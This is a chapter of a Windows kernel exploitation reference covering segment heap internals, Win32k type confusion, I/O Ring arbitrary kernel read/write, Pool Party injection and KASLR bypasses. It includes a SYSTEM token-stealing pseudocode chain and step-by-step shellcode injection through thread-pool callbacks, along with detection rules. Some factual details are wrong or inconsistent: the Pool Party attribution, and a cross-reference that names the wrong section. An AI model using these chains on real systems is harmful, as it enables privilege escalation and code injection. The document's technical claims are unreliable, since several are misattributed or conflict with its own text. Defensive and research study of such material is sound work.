# Chapter 10: Windows Kernel & Win32k — Architecture, Exploitation, and Modern Primitives

> **Scope**: This chapter synthesizes kernel internals, pool exploitation mechanics, Win32k
> architecture, KASLR bypass techniques, I/O Ring exploitation, token-stealing primitives,
> mitigation timelines, and hands-on HEVD lab setup into a single researcher-facing reference.
> Commands are included because they are useful for finding and exploiting privilege
> escalation bugs, not as general debugging tutorials.

---

## 10.1 Segment Heap Internals: The Post-20H1 Kernel Pool

### 10.1.1 NT Heap vs Segment Heap

Before Windows 10 build 19041 (20H1, May 2020), the kernel pool used a classic
`POOL_DESCRIPTOR`-based allocator. Every allocation was preceded by a `POOL_HEADER`
structure, creating an exploitable inline metadata chain:

```
[POOL_HEADER (8 bytes)]  [allocation data ...]  [POOL_HEADER (next)]  [allocation data ...]
```

`POOL_HEADER` fields:
- `PreviousSize` / `BlockSize`: sizes in units of 8 bytes
- `PoolType`: NonPaged, Paged, Session, etc.
- `PoolTag`: 4-byte ASCII tag for auditing

This layout made pool corruption straightforward: overflow into an adjacent block's
`POOL_HEADER`, corrupt `PoolType` or freelist pointer, trigger pool free → controlled
kernel write. Pool spray via `NtAllocateVirtualMemory`, `NtCreateKey`, or GUI object
allocations produced predictable adjacency.

**With Segment Heap (kernel default from 20H1 onward)**, this model is dead. The
Segment Heap replaces `POOL_DESCRIPTOR` with a multi-tier allocator:

```
SEGMENT_HEAP
├── LFH (Low Fragmentation Heap)  — small allocations ≤ ~1 KB, bucket-aligned
├── VS  (Variable Size)           — medium allocations ~1 KB–128 KB
├── Backend allocator             — large allocations > 128 KB
└── Large Block allocator         — multi-page allocations
```

### 10.1.2 LFH — Low Fragmentation Heap

The LFH groups allocations into fixed **size buckets**. All allocations of the same
size class come from the same bucket's **subsegments** — contiguous memory regions
containing an array of same-size slots with a bitmap header:

```windbg
dt nt!_HEAP_LFH_SUBSEGMENT
// +0x000 ListEntry      : _LIST_ENTRY
// +0x010 Owner          : Ptr64 _HEAP_LFH_BUCKET
// +0x01a FreeCount      : Uint2B   ← free slots
// +0x01c BusyCount      : Uint2B   ← occupied slots
// Followed by: bitmap, then slot array
```

There is **no per-slot POOL_HEADER**. Slot identity comes from the bucket configuration.
Overflowing a slot writes into user data of the next slot — not allocator metadata.
To exploit this, you must either:
1. Overflow into an adjacent object that contains a meaningful pointer or size field, or
2. Corrupt the LFH slot bitmap, causing a double-allocation (type confusion)

### 10.1.3 VS — Variable Size Allocator

The VS allocator handles medium allocations with chunk headers that contain size
information. However, the sizes are **encoded** (XOR'd with a cookie):

```windbg
dt nt!_HEAP_VS_CHUNK_HEADER
// +0x000 Sizes     : _HEAP_VS_CHUNK_HEADER_SIZE  (encoded)
// +0x00c UnsafeSize : Uint2B
// +0x00e UnsafePrevSize : Uint2B    ← similar to PreviousSize but XOR-encoded
```

Overwriting `UnsafePrevSize` without knowing the cookie triggers a heap corruption
check rather than producing a useful primitive.

### 10.1.4 Backend and Large Block Allocators

Backend allocations (> 128 KB) have metadata stored **separately** from the allocated
data. There are no inline headers between data blocks — overflow into "adjacent" memory
does not touch allocator metadata at all.

### 10.1.5 Exploitation Implications

| Classic Technique | Why It Broke | Modern Alternative |
|---|---|---|
| Pool overflow → POOL_HEADER corruption → write primitive | No POOL_HEADER in LFH between slots | Type confusion via adjacent object corruption |
| Fake POOL_HEADER to control freelist | No exploitable LFH freelist | Target VS chunk headers (require cookie) |
| POOL_HEADER.PoolType corruption | Field gone from hot path | Corrupt object-level function pointers |
| Size-based adjacent placement | LFH buckets group by size — still predictable | Heap spray same-size objects into victim bucket |

**Practical guidance for 2024+**: Prioritize logic bugs and type confusion over heap
corruption. A logic bug (confused deputy, impersonation bypass, handle rights escalation)
requires no heap primitives, no HVCI bypass, no CFG bypass. It is more reliable and
more portable.

### 10.1.6 Windows 11 24H2 LFH Hardening (Build 26100+)

Windows 11 24H2 (build 26100, released October 2024) introduced several new hardening
measures targeting the Segment Heap attack surface that remains after the 20H1 transition.

**`_HEAP_VS_SUBSEGMENT.EncodedCommitCount` verification**:

In pre-24H2 builds, `EncodedCommitCount` in the VS subsegment header was stored but
not cryptographically bound to the subsegment's other fields. Build 26100 adds a
verification step in `RtlpHpVsSubsegmentCommit` that cross-checks `EncodedCommitCount`
against the subsegment's backing page count. Corruption of the commit count field
now triggers a fast-fail exception rather than silently proceeding.

```windbg
; Inspect VS subsegment structure (24H2)
dt nt!_HEAP_VS_SUBSEGMENT [addr]
// +0x000 ListEntry            : _LIST_ENTRY
// +0x010 CommitBitmap         : Uint8B
// +0x018 EncodedCommitCount   : Uint4B   ← verified against page count in 24H2
// +0x01c AllocatedChunkCount  : Uint4B
```

**Backend coalesce hardening — `RtlpHpSegFree` safe-unlinking check**:

The backend allocator's free path (`RtlpHpSegFree`) in build 26100 adds a
safe-unlinking check equivalent to the user-mode heap's `RtlpHpSegCoalesceInlineRanges`
verification. Before coalescing two adjacent backend segments, the kernel now validates
that `Segment->Flink->Blink == Segment` and `Segment->Blink->Flink == Segment`.
Corrupting the doubly-linked backend list no longer provides a silent write primitive.

```c
// Pseudo-code of safe-unlink check added in RtlpHpSegFree (build 26100)
if (Segment->Flink->Blink != Segment ||
    Segment->Blink->Flink != Segment) {
    RtlpHpHeapHeapBugCheck(Heap, HEAP_FAILURE_SEGMENT_VALIDATION);
    __fastfail(FAST_FAIL_HEAP_METADATA_CORRUPTION);
}
```

**Heap metadata cookie expansion (24H2)**:

The VS chunk header cookie was expanded from 2 bytes to 4 bytes per chunk in build
26100. This doubles the entropy required for a brute-force cookie bypass from 65,536
to 4,294,967,296 guesses. Combined with the commit count verification, VS header
corruption is no longer a practical primitive on fully-patched 24H2 systems.

```windbg
; VS chunk header on 24H2 — note expanded cookie field
dt nt!_HEAP_VS_CHUNK_HEADER
// +0x000 Sizes       : _HEAP_VS_CHUNK_HEADER_SIZE
// +0x004 Cookie      : Uint4B   ← 4-byte cookie in 24H2 (was 2 bytes in 22H2)
// +0x008 UnsafeSize  : Uint2B
// +0x00a UnsafePrevSize : Uint2B
```

**Type isolation improvement (build 26100+)**:

Starting in build 26100, the kernel Segment Heap segregates allocations by their
allocation site (call site hash). Objects allocated from different kernel subsystems
(e.g., NDIS vs win32k vs Mm) are placed in separate subsegments even if they share
the same size bucket. This breaks the cross-subsystem spray pattern where an attacker
filled a victim's size bucket from a different subsystem to achieve adjacency.

```windbg
; Verify type isolation in practice — compare owner fields across same-size VS chunks
dt nt!_HEAP_VS_SUBSEGMENT [addr1] Owner
dt nt!_HEAP_VS_SUBSEGMENT [addr2] Owner
; Different owners → different subsegments → cross-subsystem adjacency not possible
```

**Research impact of 24H2 hardening**: The combination of cookie expansion, safe-unlinking,
and type isolation means that VS chunk corruption is effectively eliminated as a primitive
on 24H2. LFH bitmap corruption and type confusion (via logic bugs) remain the viable
paths. Pool Party variants (Section 10.5) are unaffected since they bypass allocator
metadata entirely.

---

## 10.2 Kernel Pool Exploitation Workflow

### 10.2.1 Pre-Segment Heap (historical — still relevant for older targets)

The canonical pre-20H1 pool overflow exploitation chain:

1. **Identify pool allocation size**: determine how large the vulnerable object is
   (WinDbg `!pool`, ProcMon with GFlags heap tagging enabled)
2. **Heap spray**: fill the target pool region with attacker-controlled objects of the
   same size using APIs that allocate kernel pool (e.g., `NtCreateKey` for `CM` pool,
   `NtAllocateVirtualMemory` for `Mm` pool, GDI objects for session pool)
3. **Trigger overflow**: the vulnerable object overflows into the adjacent `POOL_HEADER`
4. **Corrupt BlockSize/PreviousSize**: engineer the corrupted header to point the
   `FreList.Flink` or pool block chain toward attacker-controlled memory
5. **Trigger pool free**: kernel frees the corrupted block
6. **Write primitive**: the unlink operation writes attacker-controlled value to
   attacker-controlled address (classic write-what-where)

### 10.2.2 Post-Segment Heap — UAF and Type Confusion

With Segment Heap, the preferred path is **use-after-free with type confusion**:

1. **Allocate victim object A** of type X (contains a function pointer at known offset)
2. **Trigger free of object A** (without zeroing the pointer)
3. **Heap spray** objects of type Y (same LFH size bucket as type X) into the freed slot
   — these contain attacker-controlled data at the function-pointer offset
4. **Trigger use of freed pointer** — kernel dispatches through the now-corrupted
   function pointer into attacker-controlled code (or ROP gadget under HVCI)

The Pool Party technique (Section 10.4) provides an alternative: avoid pool corruption
entirely by using the Worker Factory kernel interface to place attacker-controlled
structures into the thread pool work queue.

### 10.2.3 Key WinDbg Commands for Pool Analysis

```windbg
; Pool chunk at address (works for both classic and Segment Heap)
!pool [addr]

; Pool allocation statistics by tag
!poolused 2

; Find all pool blocks with specific tag (slow)
!poolfind [Tag]

; Raw old-style pool header (pre-20H1 or Paged allocations)
dt nt!_POOL_HEADER [addr]

; Segment Heap top-level structure
dt nt!_SEGMENT_HEAP [addr]

; LFH context
dt nt!_HEAP_LFH_CONTEXT [addr]

; LFH subsegment (inspect free/busy bitmap)
dt nt!_HEAP_LFH_SUBSEGMENT [addr]

; VS chunk header (check encoded sizes)
dt nt!_HEAP_VS_CHUNK_HEADER [addr]

; Verify pool spray saturation for CM (registry key) objects
!poolused 2 CM
```

---

## 10.3 Win32k.sys Architecture

### 10.3.1 Component Structure

`win32k.sys` is the Windows kernel-mode subsystem for the graphical user interface.
Since Windows 10 RS1 (1607), Microsoft split it into three components:

| Component | Function |
|---|---|
| `win32k.sys` | Thin stub, dispatcher to base/full |
| `win32kbase.sys` | Core windowing: window objects, message passing, USER heap |
| `win32kfull.sys` | GDI: graphics device interface, metafiles, printer callbacks |

Win32k runs entirely in kernel mode (Ring 0) but processes untrusted input from
arbitrary user-mode processes. It maintains:
- **Session space**: per-session mapping of win32k code + session pool allocations
- **Desktop heap**: USER objects (windows, menus, hooks, input contexts) per desktop
- **GDI objects**: bitmaps, DCs, brushes, pens, palettes — each in session pool

### 10.3.2 Session Pool and Win32k Objects

Win32k allocates USER and GDI objects from **session pool** — a pool region specific
to the Terminal Services session. Session pool uses the same Segment Heap allocator
as the normal pool but is isolated per session.

Win32k kernel objects are referenced by handles in a per-process or per-session
GDI/USER handle table. The handle table stores pointer + type + flags per entry.
Type confusion attacks target the type field: by corrupting the type index of an
object handle, the caller can make the kernel treat one object type as another,
accessing embedded pointers at wrong offsets.

### 10.3.3 NtUserThunkedMenuItemInfo and Type Confusion History

`NtUserThunkedMenuItemInfo` is a Win32k syscall for setting menu item information
via a kernel-mode thunk. Historically, it was a site for type confusion because:
- Menu item structures (MENUITEMINFO) contain pointers to sub-objects
- The type field indicating whether a sub-field is a string, bitmap, or another
  object was not consistently validated
- Providing a crafted MENUITEMINFO with wrong type indicators caused the kernel
  to dereference a user-controlled value as a kernel pointer

This pattern — providing a structure pointer where the `type` or `objecttype` field
is attacker-controlled — appears throughout Win32k history. Other historical sites
include `NtGdiSetBitmapAttributes`, `NtUserSetWindowLongPtr` (when applied to wrong
object type), and various `NtGdi*` callbacks through metafile rendering.

The common thread in Win32k type confusion:
1. A kernel API accepts a handle or structure pointer
2. The object's type is checked but the check is incomplete (missing a case, wrong
   comparison, off-by-one in the type table)
3. The kernel proceeds to use the object as a different type, reading a user-data field
   as a kernel pointer
4. Attacker sets that user-data field to a meaningful kernel address → controlled dereference

### 10.3.4 The win32kbase/win32kfull Split as Research Signal

Microsoft introduced the split partly to enable win32k syscall filtering in sandboxes.
`win32kbase` handles lower-level operations that some sandboxed processes (UWP, Edge
renderer) are still allowed. `win32kfull` handles full GUI operations that renderer
processes never need.

From a research standpoint: `win32kbase` functions have received more scrutiny since
they are still exposed to sandboxes. `win32kfull` functions (GDI metafile rendering,
advanced printer callbacks, certain WNDPROC hooks) receive less, and have historically
had higher bug density. Prioritize `win32kfull` for new bug hunting.

---

## 10.4 I/O Ring Exploitation on Windows 11

### 10.4.1 Background: Windows I/O Ring

Windows 11 introduced **I/O Ring** (`NtCreateIoRing`, `NtSubmitIoRing`) — a high-performance
I/O submission mechanism analogous to Linux's `io_uring`. The design goal is efficiency:
user mode maps a shared circular buffer with the kernel, enqueues I/O requests, submits
a batch with a single syscall, and collects completions from a separate ring — minimal
context switching.

Key structures:
```
IORING_HANDLE (user-mode)
  ├── Submission Queue (SQ) — ring buffer of IORING_SQE entries
  └── Completion Queue (CQ) — ring buffer of IORING_CQE entries
  Both rings mapped into both user-mode and kernel-mode address space
```

An `IORING_SQE` specifies:
- `opcode` — operation type (`IORING_OP_READ`, `IORING_OP_WRITE`, `IORING_OP_FLUSH`)
- `file_ref` — file handle reference
- `buffer` — user-mode virtual address of data buffer ← **the vulnerable field**
- `offset` — file offset
- `length` — bytes to transfer

### 10.4.2 The Vulnerability (Yarden Shafir, 2022)

In early Windows 11 builds, the `buffer` field in `IORING_SQE` could specify a
**kernel-mode virtual address**, and the kernel's I/O Ring dispatch code used it
directly without validating that it fell below `MmHighestUserAddress`.

This created a full arbitrary kernel read/write primitive:
- **Kernel Read**: `IORING_OP_WRITE` with `buffer` = kernel address → kernel reads from
  that address and writes it to the specified file → file contents reveal kernel memory
- **Kernel Write**: `IORING_OP_READ` with `buffer` = kernel address → kernel reads file
  contents and writes them to that address → arbitrary kernel write

### 10.4.3 Exploitation: EPROCESS Token Escalation

With the kernel R/W primitive, SYSTEM token theft becomes straightforward:

```c
// Pseudocode exploitation chain
HANDLE hRing;
IORING_CREATE_FLAGS flags = {};
NtCreateIoRing(&hRing, 3, flags, 0x10000, 0x10000);

// Step 1: Locate SYSTEM process EPROCESS
// nt!PsInitialSystemProcess exports the SYSTEM EPROCESS pointer
ULONG64 systemEprocess = KernelRead8(hRing, nt_base + PsInitialSystemProcess_offset);

// Step 2: Read SYSTEM process Token field (EPROCESS+0x4b8 on Win11 22H2)
ULONG64 systemTokenOffset = 0x4b8;
ULONG64 systemTokenValue  = KernelRead8(hRing, systemEprocess + systemTokenOffset);

// Step 3: Write SYSTEM Token into current process EPROCESS.Token
ULONG64 currentEprocess = GetCurrentEprocessAddress();  // via NtQuerySystemInformation
KernelWrite8(hRing, currentEprocess + systemTokenOffset, systemTokenValue);

// Step 4: Spawn child — inherits SYSTEM token
STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
CreateProcess(L"cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
// cmd.exe runs as SYSTEM
```

### 10.4.4 IORING_BUFFER_INFO and the Registered Buffer Primitive

An alternative (and pre-mitigation) primitive used the `IORING_BUFFER_INFO` structure
for registered buffer maps. Registering a kernel address as a "buffer" in an IoRing
allowed direct kernel pointer arithmetic via buffer offset calculations.

```windbg
; Inspect IoRing kernel structures
!handle 0 8 0 IoRing       ; find IoRing handles

dt nt!_IORING <address>    ; top-level IoRing object
dt nt!_IORING_SQ <address> ; submission queue
dt nt!_IORING_SQE <address>
; +0x000 Opcode   : IORING_OP_CODE
; +0x010 Buffer   : Ptr64 Void   ← should be < MmHighestUserAddress after patch

; Verify UM/KM boundary
dq nt!MmHighestUserAddress L1  ; typically 0x00007fffffffffff on x64
```

### 10.4.5 Mitigation Status

| Build | I/O Ring R/W Status |
|---|---|
| Windows 11 21H2 early builds | Vulnerable |
| 22621.x < 1928 | Vulnerable |
| 22621.1928+ (KB5027231, Jun 2023) | Patched — buffer addresses validated against MmHighestUserAddress |
| 23H2 and later | Patched from initial release |

CVE: CVE-2023-21748 and related CVEs in the Jan–Jun 2023 batch.

**Architectural surface persists**: The shared ring buffer design — user mode specifying
addresses that kernel code operates on — is a recurring pattern worth continued research
on new Windows APIs. Any new kernel feature with shared mapped memory structures is a
candidate for similar analysis.

### 10.4.6 Post-Patch Mitigation Deep-Dive (KB5019264)

**`IOP_MC_BUFFER_ENTRY.IoRingObject` validation** added in KB5019264 (October 2022,
pre-dating the full address validation fix):

The kernel's I/O Ring buffer registration path (`IopIoRingRegisterBuffers`) was
hardened to validate that the `IoRingObject` backpointer in each
`IOP_MC_BUFFER_ENTRY` matches the registering IoRing's kernel object address.
This prevents an attacker from crafting a fake `IOP_MC_BUFFER_ENTRY` in kernel
memory and pointing it at an IoRing they control.

```c
// Validation added in IopIoRingRegisterBuffers (post-KB5019264)
typedef struct _IOP_MC_BUFFER_ENTRY {
    ULONG       Type;
    ULONG       Reserved;
    SIZE_T      Size;
    LONG        ReferenceCount;
    ULONG       Flags;
    LIST_ENTRY  GlobalDataLink;
    PVOID       VirtualAddress;
    ULONG64     ByteCount;
    PIORING_OBJECT IoRingObject;  // ← validated against caller's IoRing object
    // ...
} IOP_MC_BUFFER_ENTRY;

// Pseudo-check:
if (BufferEntry->IoRingObject != CallerIoRingObject) {
    return STATUS_INVALID_PARAMETER;
}
```

**Remaining I/O Ring attack surface — `SqmWaitForIoCompletionPacket` race window**:

Even after address and object pointer validation, a narrow race window exists in the
completion path. `SqmWaitForIoCompletionPacket` processes completion packets from the
kernel's internal I/O completion queue into the user-visible CQ ring. Between the
moment a packet is dequeued from the kernel completion queue and the moment it is
written to the user-mode CQ buffer, a thread scheduling interrupt can cause the CQ
write to be deferred. If the user-mode CQ buffer mapping is modified (e.g., via a
concurrent `VirtualFree` + `VirtualAlloc` race on the mapping VA), the completion
write may land in an unexpected location. This race has very narrow timing requirements
and no public PoC as of 2024, but remains an open research area.

**I/O Ring on Windows Server 2025**:

Windows Server 2025 ships with the same I/O Ring mitigations as Windows 11 23H2 —
`MmHighestUserAddress` validation, `IoRingObject` backpointer check, and enhanced
buffer entry validation. However, Server 2025 adds new `IORING_OP_*` opcodes for
server workloads:

| New Opcode | Purpose | Research Note |
|---|---|---|
| `IORING_OP_SEND` | Direct socket send via IoRing | Network I/O path, new buffer handling code |
| `IORING_OP_RECV` | Direct socket receive | Kernel socket buffer mapping — new surface |
| `IORING_OP_CANCEL` | Cancel pending I/O | Cancellation race with completion path |

Each new opcode introduces new kernel code paths that handle buffer addresses — the
same class of bug (insufficient address validation) may re-appear in opcode-specific
handlers.

**Performance vs security trade-off in production cloud workloads**:

I/O Ring was adopted by Azure and cloud workloads specifically because it eliminates
per-I/O context switches. Disabling I/O Ring or downgrading to synchronous I/O has
measurable throughput impact in high-IOPS workloads (storage-intensive VMs, SQL Server
on NVMe). Microsoft's position is to harden the implementation rather than restrict
its availability. This creates forward pressure: new opcodes and capabilities will
continue to be added, and each addition is a candidate for research.

---

## 10.5 Pool Party Primitives

### 10.5.1 Context: The Problem Pool Party Solves

With Segment Heap eliminating reliable POOL_HEADER corruption, Yarden Shafir (SafeBreach,
DEF CON 2023) introduced Pool Party: a new kernel pool exploitation framework that
**bypasses the entire Segment Heap problem** by finding a different path to controlled
execution — through the kernel's Worker Factory management interface.

### 10.5.2 Worker Factory as Spray Primitive

`NtCreateWorkerFactory` creates a kernel **WORKER_FACTORY** object. The object manages
a pool of worker threads dispatching work items. The work items — `TP_WORK`, `TP_TIMER`,
`TP_IO`, etc. — are structures in user-mode memory whose callbacks are invoked by worker
threads.

**The Pool Party primitive**:
1. Open a handle to a target process (requires `PROCESS_VM_WRITE` + `PROCESS_VM_READ`)
2. Locate the target process's thread pool work item queue via `NtQueryInformationWorkerFactory`
3. Write shellcode into the target process's memory (`VirtualAllocEx` + `WriteProcessMemory`)
4. Overwrite a work item callback pointer to point to the shellcode
5. Submit the work item via `NtSetInformationWorkerFactory`
6. Target process's thread pool dispatches the work item → shellcode executes

**No pool metadata is corrupted.** The injection path goes through a legitimate kernel
interface using a legitimate handle. The malicious content is a callback pointer in a
work item structure.

### 10.5.3 The 8 Variants

| # | Object Type | Trigger Mechanism |
|---|---|---|
| 1 | `TP_WORK` | `SubmitThreadpoolWork` / `NtWorkerFactoryWorkerReady` |
| 2 | `TP_TIMER` | Timer expiry |
| 3 | `TP_IO` | I/O completion packet to completion port |
| 4 | `TP_ALPC` | ALPC message received on associated port |
| 5 | `TP_JOB` | Job object notification event |
| 6 | `TP_DIRECT` | Direct callback dispatch (bypasses queue management) |
| 7 | `TP_WAIT` | Associated waitable object signaled |
| 8 | `TP_CALLBACK_ENVIRON` | Environment-level callback, affects all work in environment |

```windbg
; Inspect Worker Factory objects
!handle 0 8 0 WorkerFactory        ; list WorkerFactory handles in process

dt nt!_WORKER_FACTORY <address>    ; kernel object structure
dt nt!_TP_WORK <address>           ; thread pool work item
!tp                                ; show all thread pool objects for process context
```

### 10.5.4 Pool Party as a Framework

Pool Party is a **framework**, not a single technique. The contribution is:
1. Identify kernel objects that contain function pointers or kernel pointers, are
   cheaply allocatable from user mode, and land in predictable pool regions
2. These become spray primitives for any bug that allows adjacent object corruption

Pool Party renders Segment Heap exploitation difficulty irrelevant by finding a different
path. However, it is primarily a **process injection** technique — privilege escalation
requires targeting a privileged process that uses the Windows thread pool.

### 10.5.5 SafinMSD Pool Party Variant 2024 — `EX_PUSH_LOCK` Pool Corruption

SafinMSD published a Pool Party variant in 2024 targeting `EX_PUSH_LOCK` structures
embedded within kernel pool allocations. The attack exploits a class of bugs where a
kernel synchronization object (`EX_PUSH_LOCK`) embedded inside a larger pool allocation
can be corrupted by an adjacent overflow.

**Attack anatomy**:

`EX_PUSH_LOCK` is an 8-byte kernel synchronization primitive used pervasively across
the kernel. When a push lock is owned (shared or exclusive), it contains a pointer to
the owning thread's `_EX_PUSH_LOCK_WAIT_BLOCK` on the thread's kernel stack.

```c
// EX_PUSH_LOCK layout
typedef union _EX_PUSH_LOCK {
    struct {
        ULONG64 Locked        : 1;
        ULONG64 Waiting       : 1;
        ULONG64 Waking        : 1;
        ULONG64 MultipleShared: 1;
        ULONG64 Shared        : 60;
    };
    ULONG64 Value;
    PVOID   Ptr;  // ← when Waiting=1, points to wait block chain
} EX_PUSH_LOCK;
```

The variant: if a pool overflow reaches an `EX_PUSH_LOCK` in the adjacent allocation
while `Waiting=1`, corrupting `Ptr` to point to an attacker-controlled kernel address
causes the push lock wake path (`ExfWakePushLock`) to write to that address — providing
a write-what-where primitive.

```windbg
; Identify EX_PUSH_LOCK instances in kernel objects near a spray target
dt nt!_OBJECT_TYPE [addr] TypeLock    ; TypeLock is an EX_PUSH_LOCK
dt nt!_FILE_OBJECT [addr] IrpListLock ; IrpListLock is an EX_PUSH_LOCK
```

**Important caveat**: This variant requires triggering the overflow at the exact moment
another thread holds the target push lock in `Waiting` state — a timing requirement
that makes it less reliable than the original Worker Factory variants. The 2024 research
demonstrates feasibility but exploitation windows are narrow.

### 10.5.6 Pool Party Detection Signatures

**Elastic detection rule (SIEM/EDR)**:

```yaml
# Elastic EQL — Pool Party Variant 1 (TP_WORK callback overwrite)
sequence by process.entity_id with maxspan=30s
  [api where host.os.type == "windows" and
   process.Ext.api.name == "NtQueryInformationWorkerFactory"]
  [api where host.os.type == "windows" and
   process.Ext.api.name == "NtSetInformationWorkerFactory" and
   process.Ext.api.parameters.WorkerFactoryInformationClass == 14]
  [process where host.os.type == "windows" and
   event.type == "start" and
   process.parent.Ext.real.pid > 0]
```

**CrowdStrike Falcon behavioral indicator**:

CrowdStrike detects Pool Party through its kernel sensor's observation of:
1. `NtQueryInformationWorkerFactory` (class `WorkerFactoryBasicInformation`) called
   from a process that has `PROCESS_VM_WRITE` access to a different process
2. Followed by `WriteProcessMemory` targeting the queried process's thread pool
   callback range
3. Followed by `NtSetInformationWorkerFactory` (class `WorkerFactoryThreadMinimum`
   or `WorkerFactoryAdjustThreadGoal`) on the target process's worker factory handle

Indicator name in Falcon telemetry: `SUSPICIOUS_THREAD_POOL_HIJACK`.

### 10.5.7 Pool Party Post-24H2 Viability Analysis

| Variant | Status on 24H2 (Build 26100) | Notes |
|---|---|---|
| V1 — TP_WORK callback overwrite | Still viable | No kernel-side mitigation; process-level detection only |
| V2 — TP_TIMER callback overwrite | Still viable | Same — user-mode structure, no kernel validation |
| V3 — TP_IO via completion port | Partially mitigated | New validation in `NtSetIoCompletion` for port object cross-process writes |
| V4 — TP_ALPC port | Still viable | ALPC has no new cross-process write validation |
| V5 — TP_JOB | Still viable | Job object notification path unchanged |
| V6 — TP_DIRECT | Still viable | Direct dispatch unchanged |
| V7 — TP_WAIT | Partially mitigated | Wait object cross-process association has new handle type check |
| V8 — TP_CALLBACK_ENVIRON | Still viable | Environment structure write path unchanged |

The 24H2 changes do not introduce a blanket mitigation for Pool Party. The
`NtSetIoCompletion` and wait object handle checks address two narrow cases but
the majority of variants remain functional. The primary defense remains EDR
behavioral monitoring.

### 10.5.8 CNG Driver Pool Exploitation as Pool Party Follow-On

The CNG (Cryptography Next Generation) kernel driver (`cng.sys`) implements IOCTL-based
key storage and cryptographic primitives. Post-24H2 research (surfaced in late 2024)
identified `cng.sys` pool allocations as a viable target for Pool Party follow-on
exploitation because:

1. `cng.sys` allocates `BCRYPT_KEY_DATA` objects in NonPagedPoolNx using predictable
   sizes (typically 0x100–0x400 bytes depending on algorithm)
2. `BCRYPT_KEY_DATA` contains a `CleanupCallback` function pointer at a fixed offset
3. The callback is invoked when the key handle is closed (`BCryptDestroyKey`)

```c
// Partial BCRYPT_KEY_DATA layout (reverse-engineered, cng.sys)
typedef struct _BCRYPT_KEY_DATA {
    ULONG          Magic;           // +0x000: 'BKEY'
    ULONG          Size;            // +0x004
    PVOID          AlgorithmObject; // +0x008: pointer to BCRYPT_ALG_HANDLE data
    ULONG          Flags;           // +0x010
    // ...
    PVOID          CleanupCallback; // +0x058: invoked on BCryptDestroyKey
    // ...
} BCRYPT_KEY_DATA;
```

By spraying CNG key objects adjacent to a vulnerable allocation and corrupting
`CleanupCallback`, an attacker gains a kernel function pointer overwrite that triggers
on a predictable user-mode action (`BCryptDestroyKey`). This is cleaner than Worker
Factory hijacking because it does not require cross-process handle access — an
intra-process kernel write is sufficient.

**Status**: Demonstrated in research context, no public PoC. The attack requires a
kernel write primitive (e.g., a separate UAF or overflow) to place the corrupted
`CleanupCallback`. It is a post-exploitation technique, not a standalone primitive.

---

## 10.6 KASLR Bypass Techniques

### 10.6.1 What KASLR Protects (and Doesn't)

Windows KASLR randomizes kernel module base addresses at boot. On x64, ntoskrnl and
drivers are randomized in a large VA range. Without knowing the kernel base address,
exploits cannot use hardcoded addresses for gadgets or data structures.

KASLR is defeated by **information disclosure**: any path that leaks a kernel pointer
to user mode before the exploit's write primitive.

### 10.6.2 NtQuerySystemInformation — Historical and Current

**Historical (pre-RS1/1607)**: `SystemModuleInformation` (class 11) and related classes
directly returned kernel base addresses to any caller. This was the dominant KASLR
bypass until Microsoft began restricting classes:

- `SystemModuleInformation` — now requires elevated privilege (patched in RS1)
- `SystemHandleInformation` — returns kernel object addresses, restricted to admins in later builds
- `SystemExtendedHandleInformation` — similar restriction path
- `SystemKernelDebuggerInformation` — returns KDBG state, not addresses

**Currently unprotected or only partially restricted**:
- `SystemBigPoolInformation` — pool block sizes/tags, occasionally leaks pool VA
- `SystemPagefileInformation` / pagefile-related classes — limited leak
- `SystemVaList` — virtual address space info, some pointer data accessible to users

The NtQuerySystemInformation bypass surface has been progressively locked down. As of
Windows 11 22H2, most classes that previously leaked kernel addresses now require
`SeDebugPrivilege` or admin. Researchers must check specific builds for what remains.

### 10.6.3 GDI Handle Leaks (Historical)

**Pre-RS1 GDI bitmap technique** (historically dominant KASLR bypass):
- `CreateBitmap` → returned a kernel object at a predictable GDI handle table address
- `NtGdiGetDIBitsInternal` and similar GDI calls returned structure data that included
  kernel pool addresses embedded in bitmap object headers
- Patched progressively: Win10 RS2 hardened the bitmap surface, RS3 removed many GDI
  information leaks from user-mode accessible paths

**GDI handle table itself** (kernel address at known offset from GDI shared section):
The GDI shared section maps into user-mode processes. In older builds, the kernel pointer
to the GDI handle table entry was directly accessible. This was mitigated.

### 10.6.4 PML4 Self-Reference (Historical)

**Historical KASLR defeat via PML4 self-reference**: Windows 10 ≤ 1607 mapped the
PML4 page table at a predictable self-referencing address pattern (`0xFFFFF6FB7DBED000`
on x64). Accessing this virtual address from user mode in certain conditions leaked
the PML4 physical address, from which the kernel base could be derived.

Patched in RS1 by randomizing the self-reference entry in PML4. This was a complete
mitigation for this specific bypass.

### 10.6.5 Current Realistic KASLR Bypass Options (2024)

In descending reliability:

1. **Information disclosure CVEs**: Bochspwn-class uninitialized kernel memory copied to
   user space. Still discovered regularly. Provides leak of specific kernel addresses.
   Examples: stack padding bytes in kernel responses to `NtQuerySystemInformation` subclasses.

2. **NtQuerySystemInformation unrestricted classes**: Must enumerate build-by-build.
   Some kernel information classes remain accessible to low-privilege callers and return
   data that includes kernel VA hints.

3. **Kernel shared data section** (`KUSER_SHARED_DATA` at `0x7ffe0000`): Contains
   build info, time, etc. — no addresses. But the fixed user-mode address of the
   kernel shared data structure itself provides a known "anchor point" for offset calculations
   when combined with a partial leak.

4. **Speculative execution side channels**: Cache-timing attacks (Spectre variant 3A/4)
   can leak kernel addresses in some configurations, but practical exploitation in kernel
   context is architecture-dependent and heavily mitigated.

5. **Heap pointer disclosure in error messages/handles**: Some Windows API error paths
   return objects that include kernel pool addresses. Must be discovered case by case.

6. **GDI object timing disclosure**: Some GDI handle operations still leak partial
   kernel address bits in timing-observable ways on specific builds.

**Practical guidance**: For targeted research, obtain a specific infoleak CVE against
the target build. For general research, focus on finding a new uninitialized memory
disclosure via the Bochspwn methodology (taint tracking on kernel-to-user copies).

### 10.6.6 NtQuerySystemInformation Class Audit 2024

A systematic audit of `NtQuerySystemInformation` classes on Windows 11 22H2/23H2 in
2024 identified the following classes as still accessible to standard (non-admin) callers
and potentially leaking kernel VA data:

| Class | Value | Leak Type | Notes |
|---|---|---|---|
| `SystemSuperfetchInformation` | 0x4f | Pointer-sized fields in superfetch structures | Partially filtered but some pointer residue observed |
| `SystemLowPriorityIoInformation` | 0x53 | Pool address in I/O statistics block | Present on some builds, filtered on others |
| `SystemCodeIntegrityPolicyInformation` | 0x62 | CI policy object kernel VA | Restricted on 22H2, varies on 21H2 |
| `SystemSecureBootPolicyInformation` | 0x82 | Boot policy blob address | Admin-restricted on 23H2 |
